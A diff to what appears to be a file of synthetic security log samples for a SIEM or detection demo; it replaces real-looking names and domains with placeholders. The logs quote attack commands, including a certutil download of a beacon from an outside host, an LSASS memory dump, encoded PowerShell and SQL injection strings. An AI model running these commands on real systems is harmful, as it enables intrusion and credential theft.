@@ -17,7 +17,7 @@ const SYSLOG_ENTRIES = [
   {ts:'2026-09-21T08:03:45Z',host:'web-prod-01',facility:'daemon',severity:'warning',msg:'nginx: 10.0.3.50 - - [21/Sep/2026:08:03:45 +0000] "POST /api/login HTTP/1.1" 401 128 "-" "python-requests/2.28.0"'},
   {ts:'2026-09-21T08:04:01Z',host:'db-primary',facility:'daemon',severity:'info',msg:'PostgreSQL: connection authorized: user=app_user database=production SSL enabled (protocol=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384)'},
   {ts:'2026-09-21T08:04:15Z',host:'db-primary',facility:'daemon',severity:'warning',msg:'PostgreSQL: statement: SELECT * FROM users WHERE id = 1; UNION SELECT username,password FROM admin_users--'},
-  {ts:'2026-09-21T08:05:00Z',host:'mail-relay',facility:'mail',severity:'info',msg:'postfix/smtp[12345]: 4A2B3C4D5E: to=<user@company.com>, relay=mx.company.com[10.0.5.1]:25, delay=0.5, status=sent'},
+  {ts:'2026-09-21T08:05:00Z',host:'mail-relay',facility:'mail',severity:'info',msg:'postfix/smtp[12345]: 4A2B3C4D5E: to=<user@example.com>, relay=mx.example.com[10.0.5.1]:25, delay=0.5, status=sent'},
   {ts:'2026-09-21T08:05:30Z',host:'dns-resolver',facility:'daemon',severity:'info',msg:'named[2048]: client 10.0.2.100#43210 (evil-c2.xyz): query: evil-c2.xyz IN A + (10.0.1.53)'},
   {ts:'2026-09-21T08:05:31Z',host:'dns-resolver',facility:'daemon',severity:'info',msg:'named[2048]: client 10.0.2.100#43211 (evil-c2.xyz): query: evil-c2.xyz IN AAAA + (10.0.1.53)'},
   {ts:'2026-09-21T08:06:00Z',host:'proxy-01',facility:'daemon',severity:'warning',msg:'squid[3456]: 1632211560.000 10.0.2.100 TCP_DENIED/403 3900 CONNECT evil-c2.xyz:443 - HIER_NONE/- text/html'},
@@ -29,7 +29,7 @@ const SYSLOG_ENTRIES = [
   {ts:'2026-09-21T08:09:00Z',host:'k8s-master',facility:'daemon',severity:'warning',msg:'kubelet[9012]: E0921 08:09:00.123456 Container runtime error: failed to pull image "registry.evil.com/backdoor:latest"'},
   {ts:'2026-09-21T08:09:30Z',host:'ldap-server',facility:'auth',severity:'info',msg:'slapd[3456]: conn=1000 fd=12 ACCEPT from IP=10.0.2.50:49152 (IP=0.0.0.0:389)'},
   {ts:'2026-09-21T08:10:00Z',host:'ldap-server',facility:'auth',severity:'warning',msg:'slapd[3456]: conn=1000 op=1 SRCH base="dc=corp,dc=local" scope=2 deref=0 filter="(objectClass=*)" attrs="*"'},
-  {ts:'2026-09-21T08:10:30Z',host:'radius-srv',facility:'auth',severity:'info',msg:'radiusd: Login OK: user=jsmith from client=wap-floor3 port=1 via TLS'},
+  {ts:'2026-09-21T08:10:30Z',host:'radius-srv',facility:'auth',severity:'info',msg:'radiusd: Login OK: user=user1 from client=wap-floor3 port=1 via TLS'},
   {ts:'2026-09-21T08:11:00Z',host:'fw-core-01',facility:'kern',severity:'error',msg:'[UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=10.0.1.5 PROTO=TCP DPT=445 SPT=61234 LEN=52'},
   {ts:'2026-09-21T08:11:30Z',host:'web-prod-02',facility:'daemon',severity:'error',msg:'nginx: 203.0.113.42 - - "GET /../../../../etc/passwd HTTP/1.1" 400 166 "-" "Nikto/2.1.6"'},
   {ts:'2026-09-21T08:12:00Z',host:'siem-collector',facility:'daemon',severity:'info',msg:'logstash[4567]: Pipeline main started {"pipeline.id":"main","pipeline.workers":4}'},
@@ -67,7 +67,7 @@ const SYSLOG_ENTRIES = [
   {ts:'2026-09-21T08:26:30Z',host:'auditd',facility:'auth',severity:'warning',msg:'type=EXECVE msg=audit(1632211590.000:1236): argc=2 a0="/bin/bash" a1="/tmp/payload.sh"'},
   {ts:'2026-09-21T08:27:00Z',host:'iptables-log',facility:'kern',severity:'info',msg:'iptables: FORWARD DROP IN=docker0 OUT=eth0 SRC=172.17.0.5 DST=169.254.169.254 LEN=60 PROTO=TCP DPT=80'},
   {ts:'2026-09-21T08:27:30Z',host:'systemd',facility:'daemon',severity:'error',msg:'systemd[1]: suspicious.service: Main process exited, code=killed, status=9/KILL'},
-  {ts:'2026-09-21T08:28:00Z',host:'pam-module',facility:'auth',severity:'error',msg:'pam_unix(su:auth): authentication failure; logname=jsmith uid=1001 euid=0 tty=pts/3 ruser=jsmith rhost= user=root'},
+  {ts:'2026-09-21T08:28:00Z',host:'pam-module',facility:'auth',severity:'error',msg:'pam_unix(su:auth): authentication failure; logname=user1 uid=1001 euid=0 tty=pts/3 ruser=user1 rhost= user=root'},
   {ts:'2026-09-21T08:28:30Z',host:'fail2ban',facility:'daemon',severity:'info',msg:'fail2ban.actions: NOTICE [sshd] Ban 185.220.101.34'},
   {ts:'2026-09-21T08:29:00Z',host:'fail2ban',facility:'daemon',severity:'info',msg:'fail2ban.actions: NOTICE [sshd] Ban 92.63.197.48'},
   {ts:'2026-09-21T08:29:30Z',host:'ossec-agent',facility:'daemon',severity:'alert',msg:'ossec: Alert Level 12 - Integrity checksum changed for /etc/shadow'},
@@ -85,29 +85,29 @@ const JSON_LOGS = [
   {ts:'2026-09-21T08:16:00Z',source:'aws-cloudtrail',data:{eventName:'AttachUserPolicy',userIdentity:{type:'IAMUser',userName:'admin-user'},requestParameters:{userName:'backdoor-user',policyArn:'arn:aws:iam::aws:policy/AdministratorAccess'},sourceIPAddress:'198.51.100.50'}},
   {ts:'2026-09-21T08:16:30Z',source:'aws-cloudtrail',data:{eventName:'PutBucketPolicy',userIdentity:{type:'IAMUser',userName:'backdoor-user'},requestParameters:{bucketName:'sensitive-data-prod',bucketPolicy:{Statement:[{Effect:'Allow',Principal:'*',Action:'s3:GetObject',Resource:'arn:aws:s3:::sensitive-data-prod/*'}]}}}},
   {ts:'2026-09-21T08:17:00Z',source:'azure-activity',data:{operationName:'MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE',caller:'attacker@tenant.onmicrosoft.com',resourceGroupName:'prod-rg',properties:{statusCode:'Created',serviceRequestId:'abc-123'},level:'Informational'}},
-  {ts:'2026-09-21T08:17:30Z',source:'azure-signin',data:{userPrincipalName:'admin@company.com',ipAddress:'45.33.32.156',status:{errorCode:0,failureReason:null},location:{city:'Moscow',state:'Moscow',countryOrRegion:'RU'},appDisplayName:'Azure Portal',riskLevelDuringSignIn:'high'}},
+  {ts:'2026-09-21T08:17:30Z',source:'azure-signin',data:{userPrincipalName:'admin@example.com',ipAddress:'45.33.32.156',status:{errorCode:0,failureReason:null},location:{city:'Moscow',state:'Moscow',countryOrRegion:'RU'},appDisplayName:'Azure Portal',riskLevelDuringSignIn:'high'}},
   {ts:'2026-09-21T08:18:00Z',source:'gcp-audit',data:{serviceName:'iam.googleapis.com',methodName:'google.iam.admin.v1.CreateServiceAccountKey',authenticationInfo:{principalEmail:'compromised@project.iam.gserviceaccount.com'},request:{name:'projects/-/serviceAccounts/compromised@project.iam.gserviceaccount.com'}}},
-  {ts:'2026-09-21T08:18:30Z',source:'okta-syslog',data:{actor:{displayName:'John Smith',alternateId:'jsmith@company.com'},outcome:{result:'FAILURE',reason:'INVALID_CREDENTIALS'},client:{ipAddress:'198.51.100.99',userAgent:'python-requests/2.28.0',geographicalContext:{country:'CN',city:'Beijing'}},eventType:'user.session.start'}},
-  {ts:'2026-09-21T08:19:00Z',source:'okta-syslog',data:{actor:{displayName:'John Smith',alternateId:'jsmith@company.com'},outcome:{result:'SUCCESS'},client:{ipAddress:'198.51.100.99',userAgent:'python-requests/2.28.0',geographicalContext:{country:'CN',city:'Beijing'}},eventType:'user.session.start',debugContext:{debugData:{factor:'SMS',behaviors:'New Geo-Location=NEGATIVE,New Device=NEGATIVE'}}}},
+  {ts:'2026-09-21T08:18:30Z',source:'okta-syslog',data:{actor:{displayName:'Example User',alternateId:'user1@example.com'},outcome:{result:'FAILURE',reason:'INVALID_CREDENTIALS'},client:{ipAddress:'198.51.100.99',userAgent:'python-requests/2.28.0',geographicalContext:{country:'CN',city:'Beijing'}},eventType:'user.session.start'}},
+  {ts:'2026-09-21T08:19:00Z',source:'okta-syslog',data:{actor:{displayName:'Example User',alternateId:'user1@example.com'},outcome:{result:'SUCCESS'},client:{ipAddress:'198.51.100.99',userAgent:'python-requests/2.28.0',geographicalContext:{country:'CN',city:'Beijing'}},eventType:'user.session.start',debugContext:{debugData:{factor:'SMS',behaviors:'New Geo-Location=NEGATIVE,New Device=NEGATIVE'}}}},
   {ts:'2026-09-21T08:19:30Z',source:'github-audit',data:{action:'repo.download_zip',actor:'unknown-user',repo:'company/secret-repo',actor_ip:'45.33.32.156',created_at:'2026-09-21T08:19:30Z'}},
-  {ts:'2026-09-21T08:20:00Z',source:'slack-audit',data:{action:{type:'user_login',actor:{user:{email:'admin@company.com'}},context:{ip_address:'198.51.100.50',location:{domain:'slack.com'}},details:{method:'password'}}}},
-  {ts:'2026-09-21T08:20:30Z',source:'o365-audit',data:{Operation:'FileDownloaded',UserId:'admin@company.com',ClientIP:'198.51.100.50',ObjectId:'https://company.sharepoint.com/sites/finance/Shared Documents/payroll-2026.xlsx',Workload:'SharePoint'}},
-  {ts:'2026-09-21T08:21:00Z',source:'crowdstrike',data:{event_simpleName:'ProcessRollup2',CommandLine:'powershell.exe -nop -w hidden -enc aQBlAHgA...',ParentCommandLine:'cmd.exe /c',SHA256:'a1b2c3d4e5f6...', DetectName:'SuspiciousPowerShell',Severity:4,UserName:'CORP\\jsmith',ComputerName:'WS-JSMITH-01'}},
-  {ts:'2026-09-21T08:21:30Z',source:'crowdstrike',data:{event_simpleName:'DnsRequest',DomainName:'data-exfil.evil.com',ContextProcessId:'1234',ComputerName:'WS-JSMITH-01',RequestType:'A'}},
+  {ts:'2026-09-21T08:20:00Z',source:'slack-audit',data:{action:{type:'user_login',actor:{user:{email:'admin@example.com'}},context:{ip_address:'198.51.100.50',location:{domain:'slack.com'}},details:{method:'password'}}}},
+  {ts:'2026-09-21T08:20:30Z',source:'o365-audit',data:{Operation:'FileDownloaded',UserId:'admin@example.com',ClientIP:'198.51.100.50',ObjectId:'https://company.sharepoint.com/sites/finance/Shared Documents/payroll-2026.xlsx',Workload:'SharePoint'}},
+  {ts:'2026-09-21T08:21:00Z',source:'crowdstrike',data:{event_simpleName:'ProcessRollup2',CommandLine:'powershell.exe -nop -w hidden -enc aQBlAHgA...',ParentCommandLine:'cmd.exe /c',SHA256:'a1b2c3d4e5f6...', DetectName:'SuspiciousPowerShell',Severity:4,UserName:'CORP\\user1',ComputerName:'WS-USER1-01'}},
+  {ts:'2026-09-21T08:21:30Z',source:'crowdstrike',data:{event_simpleName:'DnsRequest',DomainName:'data-exfil.evil.com',ContextProcessId:'1234',ComputerName:'WS-USER1-01',RequestType:'A'}},
   {ts:'2026-09-21T08:22:00Z',source:'paloalto',data:{type:'THREAT',subtype:'spyware',src:'10.0.2.100',dst:'45.33.32.156',rule:'outbound-threat',threatid:'Command and Control Traffic(13000)',action:'alert',severity:'critical',app:'ssl',category:'malware'}},
   {ts:'2026-09-21T08:22:30Z',source:'aws-guardduty',data:{type:'Trojan:EC2/C&CActivity.B!DNS',severity:8,resource:{instanceId:'i-0abc123def',region:'us-east-1'},service:{action:{dnsRequestAction:{domain:'evil-c2.xyz',protocol:'UDP'}},count:15}}},
   {ts:'2026-09-21T08:23:00Z',source:'aws-guardduty',data:{type:'UnauthorizedAccess:IAMUser/ConsoleLogin',severity:5,resource:{accessKeyId:'AKIA1234567890'},service:{action:{awsApiCallAction:{api:'ConsoleLogin',serviceName:'signin.amazonaws.com'}},count:1}}},
   {ts:'2026-09-21T08:23:30Z',source:'azure-defender',data:{alertName:'Suspicious process executed',description:'A known suspicious process was detected on the machine',severity:'High',compromisedEntity:'VM-PROD-01',remediationSteps:'Investigate the process chain and isolate if confirmed malicious'}},
-  {ts:'2026-09-21T08:24:00Z',source:'crowdstrike',data:{event_simpleName:'SuspiciousActivity',CommandLine:'certutil.exe -urlcache -split -f http://198.51.100.50/beacon.exe C:\\Windows\\Temp\\update.exe',ParentCommandLine:'cmd.exe /c',SHA256:'b2c3d4e5f6a7...',DetectName:'CertutilDownload',Severity:3,UserName:'CORP\\jsmith',ComputerName:'WS-JSMITH-01'}},
-  {ts:'2026-09-21T08:24:30Z',source:'crowdstrike',data:{event_simpleName:'RegKeyCreated',RegObjectName:'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate',RegStringValue:'C:\\Windows\\Temp\\update.exe',ComputerName:'WS-JSMITH-01',UserName:'CORP\\jsmith'}},
-  {ts:'2026-09-21T08:25:00Z',source:'sentinelone',data:{threatInfo:{threatName:'CobaltStrike.Beacon',classification:'Malware',confidenceLevel:'malicious',filePath:'C:\\Windows\\Temp\\beacon.dll',sha256:'d4e5f6a7b8c9...'},agentRealtimeInfo:{agentComputerName:'WS-JSMITH-01',agentOsType:'windows',siteName:'Production'},mitigationStatus:'active'}},
-  {ts:'2026-09-21T08:25:30Z',source:'o365-audit',data:{Operation:'New-InboxRule',UserId:'jsmith@company.com',ClientIP:'198.51.100.99',Parameters:[{Name:'Name',Value:'Auto-Forward'},{Name:'ForwardTo',Value:'attacker@evil-domain.com'},{Name:'MarkAsRead',Value:'True'}],Workload:'Exchange'}},
-  {ts:'2026-09-21T08:26:00Z',source:'duo-auth',data:{result:'SUCCESS',reason:'Valid passcode',username:'admin@company.com',factor:'push',integration:'VPN Gateway',ip:'198.51.100.50',location:{city:'Moscow',state:'Moscow',country:'Russian Federation'},access_device:{os:'Windows 10',browser:'Chrome'}}},
-  {ts:'2026-09-21T08:26:30Z',source:'zscaler',data:{action:'Blocked',category:'Advanced Threats',url:'https://malware-download.xyz/payload.exe',user:'msmith@company.com',department:'Finance',srcip:'10.0.3.75',threat_name:'Known Phishing URL',risk_score:95}},
-  {ts:'2026-09-21T08:27:00Z',source:'proofpoint',data:{messageID:'<abc123@evil-smtp.xyz>',sender:'ceo@company-lookalike.com',recipient:'cfo@company.com',subject:'Urgent Wire Transfer Required',classification:'Phishing',threatsInfo:{category:'BEC',campaignId:'BEC-2026-0921'},quarantined:true}},
+  {ts:'2026-09-21T08:24:00Z',source:'crowdstrike',data:{event_simpleName:'SuspiciousActivity',CommandLine:'certutil.exe -urlcache -split -f http://198.51.100.50/beacon.exe C:\\Windows\\Temp\\update.exe',ParentCommandLine:'cmd.exe /c',SHA256:'b2c3d4e5f6a7...',DetectName:'CertutilDownload',Severity:3,UserName:'CORP\\user1',ComputerName:'WS-USER1-01'}},
+  {ts:'2026-09-21T08:24:30Z',source:'crowdstrike',data:{event_simpleName:'RegKeyCreated',RegObjectName:'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate',RegStringValue:'C:\\Windows\\Temp\\update.exe',ComputerName:'WS-USER1-01',UserName:'CORP\\user1'}},
+  {ts:'2026-09-21T08:25:00Z',source:'sentinelone',data:{threatInfo:{threatName:'CobaltStrike.Beacon',classification:'Malware',confidenceLevel:'malicious',filePath:'C:\\Windows\\Temp\\beacon.dll',sha256:'d4e5f6a7b8c9...'},agentRealtimeInfo:{agentComputerName:'WS-USER1-01',agentOsType:'windows',siteName:'Production'},mitigationStatus:'active'}},
+  {ts:'2026-09-21T08:25:30Z',source:'o365-audit',data:{Operation:'New-InboxRule',UserId:'user1@example.com',ClientIP:'198.51.100.99',Parameters:[{Name:'Name',Value:'Auto-Forward'},{Name:'ForwardTo',Value:'attacker@evil-domain.com'},{Name:'MarkAsRead',Value:'True'}],Workload:'Exchange'}},
+  {ts:'2026-09-21T08:26:00Z',source:'duo-auth',data:{result:'SUCCESS',reason:'Valid passcode',username:'admin@example.com',factor:'push',integration:'VPN Gateway',ip:'198.51.100.50',location:{city:'Moscow',state:'Moscow',country:'Russian Federation'},access_device:{os:'Windows 10',browser:'Chrome'}}},
+  {ts:'2026-09-21T08:26:30Z',source:'zscaler',data:{action:'Blocked',category:'Advanced Threats',url:'https://malware-download.xyz/payload.exe',user:'user2@example.com',department:'Finance',srcip:'10.0.3.75',threat_name:'Known Phishing URL',risk_score:95}},
+  {ts:'2026-09-21T08:27:00Z',source:'proofpoint',data:{messageID:'<abc123@evil-smtp.xyz>',sender:'ceo@company-lookalike.com',recipient:'cfo@example.com',subject:'Urgent Wire Transfer Required',classification:'Phishing',threatsInfo:{category:'BEC',campaignId:'BEC-2026-0921'},quarantined:true}},
   {ts:'2026-09-21T08:27:30Z',source:'splunk-ueba',data:{anomalyType:'Abnormal Data Download',user:'svc-admin',riskScore:92,dataVolume:'450MB',normalBaseline:'5MB',entity:'10.0.2.100',category:'Data Exfiltration',firstSeen:'2026-09-21T08:36:00Z',lastSeen:'2026-09-21T08:41:00Z'}},
   {ts:'2026-09-21T08:28:00Z',source:'wazuh',data:{rule:{id:5712,level:10,description:'SSHD brute force trying to get access to the system.'},agent:{name:'auth-server',ip:'10.0.1.5'},full_log:'Sep 21 08:28:00 auth-server sshd[12345]: Failed password for root from 185.220.101.34 port 54825 ssh2',srcip:'185.220.101.34',dstuser:'root'}},
-  {ts:'2026-09-21T08:28:30Z',source:'elastic-alert',data:{rule_name:'Potential Credential Dumping via LSASS Memory',severity:'critical',host_name:'WS-JSMITH-01',process_name:'rundll32.exe',args:'comsvcs.dll MiniDump 652 C:\\Windows\\Temp\\lsass.dmp full',user:'CORP\\svc-admin',parent_process:'cmd.exe'}},
+  {ts:'2026-09-21T08:28:30Z',source:'elastic-alert',data:{rule_name:'Potential Credential Dumping via LSASS Memory',severity:'critical',host_name:'WS-USER1-01',process_name:'rundll32.exe',args:'comsvcs.dll MiniDump 652 C:\\Windows\\Temp\\lsass.dmp full',user:'CORP\\svc-admin',parent_process:'cmd.exe'}},
   {ts:'2026-09-21T08:29:00Z',source:'darktrace',data:{deviceLabel:'10.0.2.100',modelName:'Compromise::Beacon to External Rare',score:97,category:'Compromise',details:'Device making regular connections to 45.33.32.156 every 60s +/- 5s jitter',mitreTactic:'Command and Control',mitreId:'T1071.001'}},
   {ts:'2026-09-21T08:29:30Z',source:'carbon-black',data:{type:'watchlist.hit',process_name:'mimikatz.exe',process_pid:4567,process_username:'CORP\\svc-admin',process_path:'C:\\Windows\\Temp\\mimikatz.exe',process_md5:'abc123def456',watchlist_name:'Known Attack Tools',severity:10}},
 ];
@@ -124,13 +124,13 @@ const CEF_LOGS = [
   {ts:'2026-09-21T08:27:00Z',raw:'CEF:0|McAfee|ENS|10.7|1092|Buffer Overflow Detected|8|src=10.0.2.200 suser=SYSTEM sproc=svchost.exe msg=Heap spray pattern detected in browser process'},
   {ts:'2026-09-21T08:27:30Z',raw:'CEF:0|Imperva|WAF|14.7|sql_injection|SQL Injection Attack|9|src=203.0.113.42 dst=10.0.1.20 request=/api/search?q=1 OR 1=1-- act=blocked msg=Union-based SQL injection attempt'},
   {ts:'2026-09-21T08:28:00Z',raw:'CEF:0|SentinelOne|Singularity|22.1|MALICIOUS|Ransomware Behavior|10|src=10.0.2.150 suser=CORP\\\\jdoe sproc=locker.exe msg=Rapid file encryption detected across network shares act=kill'},
-  {ts:'2026-09-21T08:28:30Z',raw:'CEF:0|Zscaler|ZIA|6.1|ThreatBlocked|Phishing URL Blocked|6|src=10.0.3.75 request=https://login-microsoft365.evil.com/auth cat=phishing act=blocked suser=msmith@company.com'},
+  {ts:'2026-09-21T08:28:30Z',raw:'CEF:0|Zscaler|ZIA|6.1|ThreatBlocked|Phishing URL Blocked|6|src=10.0.3.75 request=https://login-microsoft365.evil.com/auth cat=phishing act=blocked suser=user2@example.com'},
   {ts:'2026-09-21T08:29:00Z',raw:'CEF:0|Darktrace|Enterprise|6.0|Compromise|Beacon to External Rare Destination|9|src=10.0.2.100 dst=45.33.32.156 dpt=443 proto=TCP cnt=97 msg=Regular 60s beacon pattern detected act=alert'},
-  {ts:'2026-09-21T08:29:30Z',raw:'CEF:0|Proofpoint|TAP|8.0|MessagesBlocked|BEC Phishing Attempt|8|suser=ceo@company-lookalike.com duser=cfo@company.com msg=Business Email Compromise detected act=quarantine'},
+  {ts:'2026-09-21T08:29:30Z',raw:'CEF:0|Proofpoint|TAP|8.0|MessagesBlocked|BEC Phishing Attempt|8|suser=ceo@company-lookalike.com duser=cfo@example.com msg=Business Email Compromise detected act=quarantine'},
   {ts:'2026-09-21T08:30:00Z',raw:'CEF:0|Wazuh|HIDS|4.7|5712|SSH Brute Force|7|src=185.220.101.34 dst=10.0.1.5 dpt=22 cnt=50 msg=SSHD brute force trying to get access to the system act=alert'},
   {ts:'2026-09-21T08:30:30Z',raw:'CEF:0|Palo Alto Networks|PAN-OS|10.2|TRAFFIC|end|3|src=10.0.2.100 dst=198.51.100.50 dpt=443 proto=TCP bytesOut=471859200 app=ssl-tunneling act=allow msg=Large outbound transfer detected'},
   {ts:'2026-09-21T08:31:00Z',raw:'CEF:0|Cylance|CylancePROTECT|3.0|ThreatQuarantine|Malicious File Quarantined|8|sproc=C:\\Windows\\Temp\\beacon.dll suser=CORP\\\\svc-admin msg=Memory-only threat detected and quarantined act=quarantine'},
-  {ts:'2026-09-21T08:31:30Z',raw:'CEF:0|FireEye|HX|5.0|IOCMatch|IOC Alert|7|src=10.0.2.100 suser=CORP\\\\jsmith sproc=rundll32.exe msg=Cobalt Strike IOC matched: named pipe \\\\MSSE-1234-server act=alert'},
+  {ts:'2026-09-21T08:31:30Z',raw:'CEF:0|FireEye|HX|5.0|IOCMatch|IOC Alert|7|src=10.0.2.100 suser=CORP\\\\user1 sproc=rundll32.exe msg=Cobalt Strike IOC matched: named pipe \\\\MSSE-1234-server act=alert'},
   {ts:'2026-09-21T08:32:00Z',raw:'CEF:0|Elastic|SIEM|8.10|rule.id=12345|Potential DCSync Attack|10|src=10.0.2.100 dst=10.0.1.1 suser=svc-admin msg=Directory replication request from non-DC source act=alert'},
   {ts:'2026-09-21T08:32:30Z',raw:'CEF:0|Cisco|Umbrella|2.0|DNS|DNS Tunneling Detected|8|src=10.0.2.100 request=long-encoded-string.evil-c2.xyz requestMethod=A msg=DNS query length exceeds threshold (>60 chars) act=blocked'},
   {ts:'2026-09-21T08:33:00Z',raw:'CEF:0|Tenable|Nessus|10.5|VulnDetected|Critical Vulnerability Found|9|dst=10.0.1.20 dpt=443 msg=Apache Log4j RCE (CVE-2021-44228) - Exploitable act=reported cs1=CVSS:10.0'},
@@ -151,23 +151,23 @@ const WINDOWS_EVENTS = [
   {ts:'2026-09-21T08:34:30Z',eventId:1102,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'The audit log was cleared.',data:{SubjectUserName:'svc-admin',SubjectDomainName:'CORP'}},
   {ts:'2026-09-21T08:35:00Z',eventId:7045,channel:'System',computer:'DC-01.corp.local',level:'Information',msg:'A service was installed in the system.',data:{ServiceName:'WindowsUpdate',ImagePath:'C:\\Windows\\Temp\\svc.exe',ServiceType:'user mode service',StartType:'auto start',AccountName:'LocalSystem'}},
   {ts:'2026-09-21T08:35:30Z',eventId:4698,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A scheduled task was created.',data:{TaskName:'\\Microsoft\\Windows\\UpdateCheck',SubjectUserName:'svc-admin',TaskContent:'<Actions><Exec><Command>C:\\Windows\\Temp\\beacon.exe</Command></Exec></Actions>'}},
-  {ts:'2026-09-21T08:36:00Z',eventId:5156,channel:'Security',computer:'WS-JSMITH-01',level:'Information',msg:'Windows Filtering Platform permitted a connection.',data:{Application:'\\device\\harddiskvolume2\\windows\\system32\\svchost.exe',Direction:'Outbound',SourceAddress:'10.0.2.100',DestAddress:'45.33.32.156',DestPort:443,Protocol:6}},
+  {ts:'2026-09-21T08:36:00Z',eventId:5156,channel:'Security',computer:'WS-USER1-01',level:'Information',msg:'Windows Filtering Platform permitted a connection.',data:{Application:'\\device\\harddiskvolume2\\windows\\system32\\svchost.exe',Direction:'Outbound',SourceAddress:'10.0.2.100',DestAddress:'45.33.32.156',DestPort:443,Protocol:6}},
   {ts:'2026-09-21T08:36:30Z',eventId:4663,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'An attempt was made to access an object.',data:{SubjectUserName:'svc-admin',ObjectName:'\\\\FS-01\\Finance\\Q3-Results.xlsx',AccessMask:'0x1',ProcessName:'C:\\Windows\\System32\\cmd.exe'}},
   {ts:'2026-09-21T08:37:00Z',eventId:4663,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'An attempt was made to access an object.',data:{SubjectUserName:'svc-admin',ObjectName:'\\\\FS-01\\HR\\Employee-SSN.csv',AccessMask:'0x1',ProcessName:'C:\\Windows\\System32\\cmd.exe'}},
   {ts:'2026-09-21T08:37:30Z',eventId:4648,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A logon was attempted using explicit credentials.',data:{SubjectUserName:'svc-admin',TargetUserName:'domain-admin',TargetServerName:'DC-02.corp.local',ProcessName:'C:\\Windows\\System32\\runas.exe'}},
-  {ts:'2026-09-21T08:38:00Z',eventId:1116,channel:'Microsoft-Windows-Windows Defender/Operational',computer:'WS-JSMITH-01',level:'Warning',msg:'Windows Defender Antivirus detected malware.',data:{ThreatName:'Trojan:Win32/CobaltStrike.B',Path:'C:\\Users\\jsmith\\AppData\\Local\\Temp\\beacon.dll',Action:'Quarantine',SeverityName:'Severe'}},
-  {ts:'2026-09-21T08:38:30Z',eventId:11,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'FileCreate.',data:{TargetFilename:'C:\\Windows\\Temp\\mimikatz.exe',Image:'C:\\Windows\\System32\\cmd.exe',User:'CORP\\svc-admin'}},
-  {ts:'2026-09-21T08:39:00Z',eventId:3,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Network connection detected.',data:{Image:'C:\\Windows\\Temp\\beacon.dll',User:'CORP\\svc-admin',Protocol:'tcp',SourceIp:'10.0.2.100',SourcePort:49321,DestinationIp:'45.33.32.156',DestinationPort:443}},
-  {ts:'2026-09-21T08:39:30Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\net.exe',CommandLine:'net group "Domain Admins" /domain',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe',ParentCommandLine:'cmd.exe /c'}},
-  {ts:'2026-09-21T08:40:00Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\nltest.exe',CommandLine:'nltest /dclist:corp.local',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe'}},
-  {ts:'2026-09-21T08:40:30Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\dsquery.exe',CommandLine:'dsquery computer -limit 0',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe'}},
-  {ts:'2026-09-21T08:41:00Z',eventId:4776,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'The computer attempted to validate the credentials for an account.',data:{TargetUserName:'svc-admin',Workstation:'WS-JSMITH-01',Status:'0x0'}},
+  {ts:'2026-09-21T08:38:00Z',eventId:1116,channel:'Microsoft-Windows-Windows Defender/Operational',computer:'WS-USER1-01',level:'Warning',msg:'Windows Defender Antivirus detected malware.',data:{ThreatName:'Trojan:Win32/CobaltStrike.B',Path:'C:\\Users\\user1\\AppData\\Local\\Temp\\beacon.dll',Action:'Quarantine',SeverityName:'Severe'}},
+  {ts:'2026-09-21T08:38:30Z',eventId:11,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-USER1-01',level:'Information',msg:'FileCreate.',data:{TargetFilename:'C:\\Windows\\Temp\\mimikatz.exe',Image:'C:\\Windows\\System32\\cmd.exe',User:'CORP\\svc-admin'}},
+  {ts:'2026-09-21T08:39:00Z',eventId:3,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-USER1-01',level:'Information',msg:'Network connection detected.',data:{Image:'C:\\Windows\\Temp\\beacon.dll',User:'CORP\\svc-admin',Protocol:'tcp',SourceIp:'10.0.2.100',SourcePort:49321,DestinationIp:'45.33.32.156',DestinationPort:443}},
+  {ts:'2026-09-21T08:39:30Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-USER1-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\net.exe',CommandLine:'net group "Domain Admins" /domain',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe',ParentCommandLine:'cmd.exe /c'}},
+  {ts:'2026-09-21T08:40:00Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-USER1-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\nltest.exe',CommandLine:'nltest /dclist:corp.local',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe'}},
+  {ts:'2026-09-21T08:40:30Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-USER1-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\dsquery.exe',CommandLine:'dsquery computer -limit 0',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe'}},
+  {ts:'2026-09-21T08:41:00Z',eventId:4776,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'The computer attempted to validate the credentials for an account.',data:{TargetUserName:'svc-admin',Workstation:'WS-USER1-01',Status:'0x0'}},
